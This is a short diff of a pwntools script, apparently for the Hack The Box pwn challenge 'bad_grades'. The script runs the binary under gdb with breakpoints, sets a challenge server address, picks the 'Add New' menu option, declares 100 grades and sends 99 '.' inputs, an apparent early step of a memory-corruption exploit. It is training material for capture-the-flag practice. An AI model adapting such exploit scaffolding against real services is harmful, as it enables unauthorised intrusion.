@@ -7,7 +7,7 @@ elf = ELF("./bad_grades")
 #libc = ELF("./libc.so.6")
 #ld_preload = {"LD_PRELOAD": "/home/fresh/CTF/htb/bad_grades/libc.so.6"}
 
-#p = remote("1.2.3.4", 30246)
+#p = remote("83.136.255.40", 53730)
 #p = process("./restaurant")
 p = gdb.debug("./bad_grades", '''
 b *0x00400fd5
@@ -17,14 +17,17 @@ b *0x4010f1
 ''')
 
 # 2. Add New.
-p.recvline()
+print(p.recvline())
 p.sendline(b'2')
 
 # Number of Grades:
+print(p.recvline())
+p.sendline(b"100")
 
-payload = b'\x00\x00\x00\x41'
-p.recvline()
-p.sendline(payload)
+for i in range(99):
+    payload = (b".")
+    p.sendline(payload)
+
 
 p.interactive()
 
